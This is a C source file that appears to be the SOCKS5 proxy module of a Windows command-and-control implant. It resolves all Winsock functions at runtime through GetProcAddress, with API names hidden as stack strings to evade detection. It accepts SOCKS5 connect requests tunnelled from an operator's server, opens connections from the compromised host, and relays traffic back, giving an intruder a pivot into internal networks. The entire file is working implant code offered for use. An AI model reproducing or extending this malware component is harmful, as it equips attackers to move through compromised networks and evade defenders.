#include "config.h"
#ifdef INCLUDE_SOCKS_PROXY

#include "socks.h"
#include "commands.h"
#include "parser.h"
#include "package.h"

// -- Winsock API string helpers (all resolved via GetProcAddress) --
// Each xstr is scoped to the function that uses it; PIC-safe.

static BOOL _resolve_winsock(PINSTANCE inst, PSOCKS_CTX ctx) {
    xstr(_ws2, "ws2_32.dll");
    ctx->hWs2_32 = inst->Win32.LoadLibraryA(_ws2);
    if (!ctx->hWs2_32) return FALSE;

    HMODULE h = (HMODULE)ctx->hWs2_32;

    // Resolve every function via GetProcAddress with stack strings
    ctx->pWSAStartup      = (fnWSAStartup)inst->Win32.GetProcAddress(h, XSTR("WSAStartup"));
    ctx->pWSACleanup      = (fnWSACleanup)inst->Win32.GetProcAddress(h, XSTR("WSACleanup"));
    ctx->pSocket          = (fn_ws_socket)inst->Win32.GetProcAddress(h, XSTR("socket"));
    ctx->pConnect         = (fn_ws_connect)inst->Win32.GetProcAddress(h, XSTR("connect"));
    ctx->pSend            = (fn_ws_send)inst->Win32.GetProcAddress(h, XSTR("send"));
    ctx->pRecv            = (fn_ws_recv)inst->Win32.GetProcAddress(h, XSTR("recv"));
    ctx->pClosesocket     = (fn_ws_closesocket)inst->Win32.GetProcAddress(h, XSTR("closesocket"));
    ctx->pSelect          = (fn_ws_select)inst->Win32.GetProcAddress(h, XSTR("select"));
    ctx->pIoctlsocket     = (fn_ws_ioctlsocket)inst->Win32.GetProcAddress(h, XSTR("ioctlsocket"));
    ctx->pHtons           = (fn_ws_htons)inst->Win32.GetProcAddress(h, XSTR("htons"));
    ctx->pHtonl           = (fn_ws_htonl)inst->Win32.GetProcAddress(h, XSTR("htonl"));
    ctx->pNtohs           = (fn_ws_ntohs)inst->Win32.GetProcAddress(h, XSTR("ntohs"));
    ctx->pInet_addr       = (fn_ws_inet_addr)inst->Win32.GetProcAddress(h, XSTR("inet_addr"));
    ctx->pGetaddrinfo     = (fn_ws_getaddrinfo)inst->Win32.GetProcAddress(h, XSTR("getaddrinfo"));
    ctx->pFreeaddrinfo    = (fn_ws_freeaddrinfo)inst->Win32.GetProcAddress(h, XSTR("freeaddrinfo"));
    ctx->pWSAGetLastError = (fn_ws_WSAGetLastError)inst->Win32.GetProcAddress(h, XSTR("WSAGetLastError"));

    if (!ctx->pWSAStartup || !ctx->pSocket || !ctx->pConnect ||
        !ctx->pSend || !ctx->pRecv || !ctx->pClosesocket ||
        !ctx->pSelect || !ctx->pIoctlsocket || !ctx->pHtons)
        return FALSE;

    return TRUE;
}

// -- Upstream queue helpers --

static VOID _queue_upstream(PINSTANCE inst, PSOCKS_CTX ctx,
                            DWORD server_id, const BYTE* data, DWORD data_len, BOOL is_exit) {
    if (ctx->upstream_count >= SOCKS_MAX_UPSTREAM) {
        // Drop oldest
        if (ctx->upstream[0].data) es_free(inst, ctx->upstream[0].data);
        for (DWORD i = 1; i < ctx->upstream_count; i++)
            ctx->upstream[i - 1] = ctx->upstream[i];
        ctx->upstream_count--;
    }
    SOCKS_UPSTREAM* u = &ctx->upstream[ctx->upstream_count];
    u->server_id = server_id;
    u->is_exit   = is_exit;
    if (data && data_len > 0) {
        u->data = (BYTE*)es_malloc(inst, data_len);
        if (u->data) {
            es_memcpy(u->data, (PVOID)data, data_len);
            u->data_len = data_len;
        } else {
            u->data_len = 0;
        }
    } else {
        u->data = NULL;
        u->data_len = 0;
    }
    ctx->upstream_count++;
}

// -- Connection table helpers --

static SOCKS_CONN* _find_conn(PSOCKS_CTX ctx, DWORD server_id) {
    for (int i = 0; i < SOCKS_MAX_CONNS; i++) {
        if (ctx->conns[i].state != SOCKS_STATE_FREE && ctx->conns[i].server_id == server_id)
            return &ctx->conns[i];
    }
    return NULL;
}

static SOCKS_CONN* _alloc_conn(PSOCKS_CTX ctx) {
    for (int i = 0; i < SOCKS_MAX_CONNS; i++) {
        if (ctx->conns[i].state == SOCKS_STATE_FREE)
            return &ctx->conns[i];
    }
    return NULL;
}

static VOID _close_conn(PSOCKS_CTX ctx, SOCKS_CONN* conn) {
    if (conn->sock != WS_INVALID_SOCKET && ctx->pClosesocket)
        ctx->pClosesocket(conn->sock);
    conn->sock      = WS_INVALID_SOCKET;
    conn->server_id = 0;
    conn->state     = SOCKS_STATE_FREE;
}

// -- SOCKS5 request parsing and TCP connect --

// Parse SOCKS5 CONNECT request from data, establish connection, queue response.
// data format: VER(1) CMD(1) RSV(1) ATYP(1) DST.ADDR(var) DST.PORT(2)
static VOID _handle_connect(PINSTANCE inst, PSOCKS_CTX ctx,
                            DWORD server_id, const BYTE* data, DWORD data_len) {
    // Build the SOCKS5 success/fail response (10 bytes for IPv4)
    // VER REP RSV ATYP BND.ADDR(4) BND.PORT(2)
    BYTE reply[10];
    reply[0] = SOCKS5_VER;
    reply[1] = SOCKS5_REP_FAIL; // default: failure
    reply[2] = 0x00;            // RSV
    reply[3] = SOCKS5_ATYP_IPV4;
    es_memset(reply + 4, 0, 6); // 0.0.0.0:0

    // Validate minimum SOCKS5 CONNECT request
    if (data_len < 7 || data[0] != SOCKS5_VER || data[1] != SOCKS5_CMD_CONNECT) {
        _queue_upstream(inst, ctx, server_id, reply, 10, FALSE);
        // Queue exit to signal connection failure
        _queue_upstream(inst, ctx, server_id, NULL, 0, TRUE);
        return;
    }

    BYTE atyp = data[3];
    ULONG  target_ip   = 0;
    USHORT target_port = 0;
    BOOL   resolved    = FALSE;

    if (atyp == SOCKS5_ATYP_IPV4) {
        // 4 bytes IPv4 + 2 bytes port
        if (data_len < 10) goto fail_reply;
        es_memcpy(&target_ip, (PVOID)(data + 4), 4);
        es_memcpy(&target_port, (PVOID)(data + 8), 2); // already network byte order
        resolved = TRUE;
    }
    else if (atyp == SOCKS5_ATYP_DOMAIN) {
        // 1 byte name_len + name + 2 bytes port
        BYTE name_len = data[4];
        if (data_len < (DWORD)(5 + name_len + 2)) goto fail_reply;

        // Null-terminate domain name on stack
        char domain[256];
        DWORD copy_len = name_len < 255 ? name_len : 255;
        es_memcpy(domain, (PVOID)(data + 5), copy_len);
        domain[copy_len] = '\0';

        es_memcpy(&target_port, (PVOID)(data + 5 + name_len), 2);

        // Resolve via getaddrinfo
        if (ctx->pGetaddrinfo && ctx->pFreeaddrinfo) {
            WS_ADDRINFO hints;
            es_memset(&hints, 0, sizeof(hints));
            hints.ai_family   = WS_AF_INET;
            hints.ai_socktype = WS_SOCK_STREAM;
            hints.ai_protocol = WS_IPPROTO_TCP;

            WS_ADDRINFO* result = NULL;
            if (ctx->pGetaddrinfo(domain, NULL, &hints, &result) == 0 && result) {
                WS_SOCKADDR_IN* sin = (WS_SOCKADDR_IN*)result->ai_addr;
                if (sin) {
                    target_ip = sin->sin_addr;
                    resolved = TRUE;
                }
                ctx->pFreeaddrinfo(result);
            }
        }

        if (!resolved) {
            // Try inet_addr as fallback (numeric IP as domain)
            if (ctx->pInet_addr) {
                ULONG addr = ctx->pInet_addr(domain);
                if (addr != 0xFFFFFFFF) {
                    target_ip = addr;
                    resolved = TRUE;
                }
            }
        }
    }
    else if (atyp == SOCKS5_ATYP_IPV6) {
        // IPv6 not supported on this agent
        reply[1] = 0x08; // address type not supported
        goto fail_reply;
    }
    else {
        goto fail_reply;
    }

    if (!resolved || target_ip == 0) goto fail_reply;

    {
        // Allocate a connection slot
        SOCKS_CONN* conn = _alloc_conn(ctx);
        if (!conn) {
            reply[1] = SOCKS5_REP_FAIL;
            goto fail_reply;
        }

        // Create TCP socket
        UINT_PTR sock = ctx->pSocket(WS_AF_INET, WS_SOCK_STREAM, WS_IPPROTO_TCP);
        if (sock == WS_INVALID_SOCKET) {
            reply[1] = SOCKS5_REP_FAIL;
            goto fail_reply;
        }

        // Set non-blocking
        unsigned long nb_mode = 1;
        ctx->pIoctlsocket(sock, WS_FIONBIO, &nb_mode);

        // Build sockaddr_in and connect
        WS_SOCKADDR_IN sa;
        es_memset(&sa, 0, sizeof(sa));
        sa.sin_family = WS_AF_INET;
        sa.sin_port   = target_port;  // already in network byte order
        sa.sin_addr   = target_ip;

        int cr = ctx->pConnect(sock, (const WS_SOCKADDR*)&sa, sizeof(sa));

        // Non-blocking connect: check if immediately connected or pending
        BOOL connected = FALSE;
        if (cr == 0) {
            connected = TRUE;
        } else {
            // Check via select with 5s timeout
            WS_FD_SET wfds;
            es_memset(&wfds, 0, sizeof(wfds));
            wfds.fd_count = 1;
            wfds.fd_array[0] = sock;

            WS_FD_SET efds;
            es_memset(&efds, 0, sizeof(efds));
            efds.fd_count = 1;
            efds.fd_array[0] = sock;

            WS_TIMEVAL tv;
            tv.tv_sec  = 5;
            tv.tv_usec = 0;

            int sel = ctx->pSelect(0, NULL, &wfds, &efds, &tv);
            if (sel > 0 && wfds.fd_count > 0)
                connected = TRUE;
        }

        if (!connected) {
            ctx->pClosesocket(sock);
            reply[1] = SOCKS5_REP_REFUSED;
            goto fail_reply;
        }

        // Fill connection slot
        conn->server_id = server_id;
        conn->sock      = sock;
        conn->state     = SOCKS_STATE_CONNECTED;

        // Send success reply upstream
        reply[1] = SOCKS5_REP_OK;
        _queue_upstream(inst, ctx, server_id, reply, 10, FALSE);
        return;
    }

fail_reply:
    _queue_upstream(inst, ctx, server_id, reply, 10, FALSE);
    _queue_upstream(inst, ctx, server_id, NULL, 0, TRUE);
}

// -- Public API --

BOOL socks_init(PINSTANCE inst) {
    if (inst->pSocksCtx) return TRUE; // already initialized

    PSOCKS_CTX ctx = (PSOCKS_CTX)es_malloc(inst, sizeof(SOCKS_CTX));
    if (!ctx) return FALSE;

    es_memset(ctx, 0, sizeof(SOCKS_CTX));
    for (int i = 0; i < SOCKS_MAX_CONNS; i++) {
        ctx->conns[i].sock  = WS_INVALID_SOCKET;
        ctx->conns[i].state = SOCKS_STATE_FREE;
    }

    if (!_resolve_winsock(inst, ctx)) {
        es_free(inst, ctx);
        return FALSE;
    }

    // WSAStartup
    WS_WSADATA wsa;
    es_memset(&wsa, 0, sizeof(wsa));
    if (ctx->pWSAStartup(WS_MAKEWORD(2, 2), &wsa) != 0) {
        es_free(inst, ctx);
        return FALSE;
    }
    ctx->wsa_up = TRUE;

    inst->pSocksCtx = ctx;
    return TRUE;
}

VOID socks_handle_downstream(PINSTANCE inst, const BYTE* buf, DWORD buf_len) {
    PSOCKS_CTX ctx = (PSOCKS_CTX)inst->pSocksCtx;
    if (!ctx) return;

    // TLV_SOCKS payload format:
    // [count: 4B BE]
    // For each entry:
    //   [server_id: 4B BE] [exit: 1B] [data_len: 4B BE] [data: var]
    if (buf_len < 4) return;
    DWORD count = ((DWORD)buf[0] << 24) | ((DWORD)buf[1] << 16) |
                  ((DWORD)buf[2] << 8)  | buf[3];
    DWORD pos = 4;

    for (DWORD i = 0; i < count; i++) {
        if (pos + 9 > buf_len) break;

        DWORD server_id = ((DWORD)buf[pos] << 24) | ((DWORD)buf[pos+1] << 16) |
                          ((DWORD)buf[pos+2] << 8) | buf[pos+3];
        pos += 4;

        BYTE is_exit = buf[pos++];

        DWORD data_len = ((DWORD)buf[pos] << 24) | ((DWORD)buf[pos+1] << 16) |
                         ((DWORD)buf[pos+2] << 8) | buf[pos+3];
        pos += 4;

        if (pos + data_len > buf_len) break;
        const BYTE* data = buf + pos;
        pos += data_len;

        // Exit: close the connection
        if (is_exit) {
            SOCKS_CONN* conn = _find_conn(ctx, server_id);
            if (conn) _close_conn(ctx, conn);
            continue;
        }

        // Find existing connection
        SOCKS_CONN* conn = _find_conn(ctx, server_id);
        if (conn) {
            // Relay data to target socket
            if (data_len > 0 && conn->state == SOCKS_STATE_CONNECTED) {
                DWORD sent = 0;
                while (sent < data_len) {
                    int r = ctx->pSend(conn->sock, (const char*)(data + sent),
                                       (int)(data_len - sent), 0);
                    if (r <= 0) {
                        // Send failed: close and notify
                        _close_conn(ctx, conn);
                        _queue_upstream(inst, ctx, server_id, NULL, 0, TRUE);
                        break;
                    }
                    sent += (DWORD)r;
                }
            }
        } else {
            // New server_id: parse SOCKS5 CONNECT request
            if (data_len > 0)
                _handle_connect(inst, ctx, server_id, data, data_len);
        }
    }
}

VOID socks_poll(PINSTANCE inst) {
    PSOCKS_CTX ctx = (PSOCKS_CTX)inst->pSocksCtx;
    if (!ctx) return;

    // Build an fd_set of all active sockets for select
    WS_FD_SET rfds;
    es_memset(&rfds, 0, sizeof(rfds));

    int conn_indices[SOCKS_MAX_CONNS];
    int active_count = 0;

    for (int i = 0; i < SOCKS_MAX_CONNS; i++) {
        if (ctx->conns[i].state == SOCKS_STATE_CONNECTED && active_count < 64) {
            rfds.fd_array[active_count] = ctx->conns[i].sock;
            conn_indices[active_count]  = i;
            active_count++;
        }
    }

    if (active_count == 0) return;
    rfds.fd_count = (UINT)active_count;

    // Zero-timeout select: non-blocking check for readable sockets
    WS_TIMEVAL tv;
    tv.tv_sec  = 0;
    tv.tv_usec = 0;

    int sel = ctx->pSelect(0, &rfds, NULL, NULL, &tv);
    if (sel <= 0) return;

    // Check each socket that was in the fd_set
    for (int j = 0; j < active_count; j++) {
        UINT_PTR sock = ctx->conns[conn_indices[j]].sock;
        // Check if this socket is in the returned readable set
        BOOL readable = FALSE;
        for (UINT k = 0; k < rfds.fd_count; k++) {
            if (rfds.fd_array[k] == sock) { readable = TRUE; break; }
        }
        if (!readable) continue;

        SOCKS_CONN* conn = &ctx->conns[conn_indices[j]];
        int r = ctx->pRecv(conn->sock, (char*)ctx->recv_buf, SOCKS_RECV_BUF_SIZE, 0);
        if (r > 0) {
            _queue_upstream(inst, ctx, conn->server_id, ctx->recv_buf, (DWORD)r, FALSE);
        } else {
            // Connection closed or error
            DWORD sid = conn->server_id;
            _close_conn(ctx, conn);
            _queue_upstream(inst, ctx, sid, NULL, 0, TRUE);
        }
    }
}

BYTE* socks_build_upstream(PINSTANCE inst, DWORD* out_len) {
    PSOCKS_CTX ctx = (PSOCKS_CTX)inst->pSocksCtx;
    if (!ctx || ctx->upstream_count == 0) {
        *out_len = 0;
        return NULL;
    }

    // Calculate total size
    // Header: count(4)
    // Per entry: server_id(4) + exit(1) + data_len(4) + data(var)
    DWORD total = 4;
    for (DWORD i = 0; i < ctx->upstream_count; i++)
        total += 4 + 1 + 4 + ctx->upstream[i].data_len;

    BYTE* buf = (BYTE*)es_malloc(inst, total);
    if (!buf) { *out_len = 0; return NULL; }

    DWORD pos = 0;
    DWORD count = ctx->upstream_count;
    buf[pos++] = (count >> 24) & 0xFF;
    buf[pos++] = (count >> 16) & 0xFF;
    buf[pos++] = (count >> 8)  & 0xFF;
    buf[pos++] = count & 0xFF;

    for (DWORD i = 0; i < count; i++) {
        SOCKS_UPSTREAM* u = &ctx->upstream[i];

        // server_id
        buf[pos++] = (u->server_id >> 24) & 0xFF;
        buf[pos++] = (u->server_id >> 16) & 0xFF;
        buf[pos++] = (u->server_id >> 8)  & 0xFF;
        buf[pos++] = u->server_id & 0xFF;

        // exit
        buf[pos++] = u->is_exit ? 1 : 0;

        // data_len + data
        DWORD dl = u->data_len;
        buf[pos++] = (dl >> 24) & 0xFF;
        buf[pos++] = (dl >> 16) & 0xFF;
        buf[pos++] = (dl >> 8)  & 0xFF;
        buf[pos++] = dl & 0xFF;

        if (u->data && dl > 0) {
            es_memcpy(buf + pos, u->data, dl);
            pos += dl;
        }

        // Free the upstream data
        if (u->data) es_free(inst, u->data);
    }

    ctx->upstream_count = 0;
    *out_len = pos;
    return buf;
}

BOOL socks_has_active(PINSTANCE inst) {
    PSOCKS_CTX ctx = (PSOCKS_CTX)inst->pSocksCtx;
    if (!ctx || !ctx->active) return FALSE;
    for (int i = 0; i < SOCKS_MAX_CONNS; i++) {
        if (ctx->conns[i].state != SOCKS_STATE_FREE)
            return TRUE;
    }
    return FALSE;
}

VOID socks_teardown(PINSTANCE inst) {
    PSOCKS_CTX ctx = (PSOCKS_CTX)inst->pSocksCtx;
    if (!ctx) return;

    // Close all connections
    for (int i = 0; i < SOCKS_MAX_CONNS; i++) {
        if (ctx->conns[i].state != SOCKS_STATE_FREE)
            _close_conn(ctx, &ctx->conns[i]);
    }

    // Free upstream queue
    for (DWORD i = 0; i < ctx->upstream_count; i++) {
        if (ctx->upstream[i].data)
            es_free(inst, ctx->upstream[i].data);
    }
    ctx->upstream_count = 0;
    ctx->active = FALSE;
}

VOID cmd_socks(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD action_len = 0;
    char* action = parser_string(args, &action_len);
    if (!action || action_len == 0) {
        package_add_string(inst, response, XSTR("Usage: socks <start|stop>"));
        response->is_error = TRUE;
        return;
    }

    // Compare action
    BOOL is_start = (action_len >= 5 && action[0] == 's' && action[1] == 't' &&
                     action[2] == 'a' && action[3] == 'r' && action[4] == 't');
    BOOL is_stop  = (action_len >= 4 && action[0] == 's' && action[1] == 't' &&
                     action[2] == 'o' && action[3] == 'p');

    if (is_start) {
        if (!socks_init(inst)) {
            package_add_string(inst, response, XSTR("Failed to initialize Winsock for SOCKS proxy"));
            response->is_error = TRUE;
            return;
        }
        PSOCKS_CTX ctx = (PSOCKS_CTX)inst->pSocksCtx;
        ctx->active = TRUE;
        package_add_string(inst, response, XSTR("SOCKS proxy started"));
    } else if (is_stop) {
        socks_teardown(inst);
        package_add_string(inst, response, XSTR("SOCKS proxy stopped"));
    } else {
        package_add_string(inst, response, XSTR("Unknown action. Use start or stop."));
        response->is_error = TRUE;
    }
}

#endif // INCLUDE_SOCKS_PROXY
